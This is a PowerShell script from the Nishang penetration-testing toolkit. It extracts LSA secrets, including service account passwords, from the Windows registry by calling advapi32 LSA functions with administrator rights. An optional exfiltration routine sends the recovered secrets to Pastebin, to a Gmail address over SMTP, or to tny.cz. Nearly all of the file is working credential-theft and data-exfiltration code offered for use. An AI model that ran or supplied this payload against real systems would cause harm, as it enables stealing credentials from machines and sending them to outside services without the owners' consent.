
<#
.SYNOPSIS
Nishang payload which extracts LSA Secrets from local computer.

.DESCRIPTION
Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
The payload must be run with elevated permissions, in 32-bit mode and requires 
permissions to the security key in HKLM. The permission could be obtained by using
Enable-DuplicateToken payload. The secrets can then exfiltrated using method of choice.

.PARAMETER RegistryKey
Name of Key to Extract. if the parameter is not used, all secrets will be displayed.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > .\Get-LsaSecret.ps1
The payload will ask for all required options.

.EXAMPLE
PS > .\Get-LsaSecret.ps1 -Key KeyName

.EXAMPLE
PS > .\Get-LsaSecret.ps1 -Key KeyName -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
http://code.google.com/p/nishang

.NOTES
Goude 2012, TreuSec
#>

[CmdletBinding(DefaultParameterSetName="noexfil")]
Param ( [Parameter(Parametersetname="exfil")] [Switch]$exfil,
[Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Parametersetname="noexfil")] [String] $registrykey,
[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

function Get-TSLsaSecret {

Begin {
# Check if User is Elevated
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
  Write-Warning "Run the Command as an Administrator"
  Break
}

# Check if Script is run in a 32-bit Environment by checking a Pointer Size
if([System.IntPtr]::Size -eq 8) {
  Write-Warning "Run PowerShell in 32-bit mode"
  Break
}



# Check if RegKey is specified
if([string]::IsNullOrEmpty($registryKey)) {
  [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
}

# Create Temporary Registry Key
if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
  mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
}

$signature = @"
[StructLayout(LayoutKind.Sequential)]
public struct LSA_UNICODE_STRING
{
  public UInt16 Length;
  public UInt16 MaximumLength;
  public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct LSA_OBJECT_ATTRIBUTES
{
  public int Length;
  public IntPtr RootDirectory;
  public LSA_UNICODE_STRING ObjectName;
  public uint Attributes;
  public IntPtr SecurityDescriptor;
  public IntPtr SecurityQualityOfService;
}

public enum LSA_AccessPolicy : long
{
  POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
  POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
  POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
  POLICY_TRUST_ADMIN = 0x00000008L,
  POLICY_CREATE_ACCOUNT = 0x00000010L,
  POLICY_CREATE_SECRET = 0x00000020L,
  POLICY_CREATE_PRIVILEGE = 0x00000040L,
  POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
  POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
  POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
  POLICY_SERVER_ADMIN = 0x00000400L,
  POLICY_LOOKUP_NAMES = 0x00000800L,
  POLICY_NOTIFICATION = 0x00001000L
}

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaRetrievePrivateData(
  IntPtr PolicyHandle,
  ref LSA_UNICODE_STRING KeyName,
  out IntPtr PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaStorePrivateData(
  IntPtr policyHandle,
  ref LSA_UNICODE_STRING KeyName,
  ref LSA_UNICODE_STRING PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaOpenPolicy(
  ref LSA_UNICODE_STRING SystemName,
  ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
  uint DesiredAccess,
  out IntPtr PolicyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaNtStatusToWinError(
  uint status
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaClose(
  IntPtr policyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaFreeMemory(
  IntPtr buffer
);
"@

Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
}

  Process{
    foreach($key in $RegistryKey) {
      $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
      $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
      $myKey = "MySecret"
      if(Test-Path $regPath) {
        Try {
          Get-ChildItem $regPath -ErrorAction Stop | Out-Null
        }
        Catch {
          Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
          Break
        }      

        if(Test-Path $regPath) {
          # Copy Key
          "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
            $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
            $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_

            if( -not(Test-Path $copyTo) ) {
              mkdir $copyTo | Out-Null
            }
            $item = Get-ItemProperty $copyFrom
            Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
          }
        }
        $Script:pastevalue
        # Attributes
        $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
        $objectAttributes.Length = 0
        $objectAttributes.RootDirectory = [IntPtr]::Zero
        $objectAttributes.Attributes = 0
        $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
        $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero

        # localSystem
        $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $localsystem.Buffer = [IntPtr]::Zero
        $localsystem.Length = 0
        $localsystem.MaximumLength = 0

        # Secret Name
        $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
        $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
        $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)

        # Get LSA PolicyHandle
        $lsaPolicyHandle = [IntPtr]::Zero
        [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
        $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)

        if($lsaOpenPolicyHandle -ne 0) {
          Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
          Continue
        }

        # Retrieve Private Data
        $privateData = [IntPtr]::Zero
        $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)

        $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)

        $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)

        if($lsaNtStatusToWinError -ne 0) {
          Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
        }

        [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
        [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [LSAUtil.LSAUtil+LSA_UNICODE_STRING])

        Try {
          [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
          $value = $value.SubString(0, ($lusSecretData.Length / 2))
        }
        Catch {
          $value = ""
        }

        if($key -match "^_SC_") {
          # Get Service Account
          $serviceName = $key -Replace "^_SC_"
          Try {
            # Get Service Account
            $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
            $account = $service.StartName
          }
          Catch {
            $account = ""
          }
        } else {
          $account = ""
        }

        # Return Object
        $obj = New-Object PSObject -Property @{
          Name = $key;
          Secret = $value;
          Account = $Account
        } 
        
        $script:pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
      
      } 
        else {
        Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
      }
    }
  }
  end {
    if(Test-Path $tempRegPath) {
      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
    }
  }
}

if($exfil -eq $True)
{
    function Do-Exfiltration
    {
        $paste_name = $env:COMPUTERNAME + ": LSA Secrets"
        function post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "0")
        {
            $pastevalue
        }

        elseif ($keyoutoption -eq "1")
        {
            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $pastevalue
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $paste_name
            $msg.Body = $pastevalue
            if ($filename)
            {
                $att = new-object Net.Mail.Attachment($filename)
                $msg.Attachments.Add($att)
            }
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            $pastevalue    
            $hash = Get-MD5
            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

    }
    Get-TSLsaSecret
    Do-Exfiltration
}

else
{
    Get-TSLsaSecret
    $pastevalue
}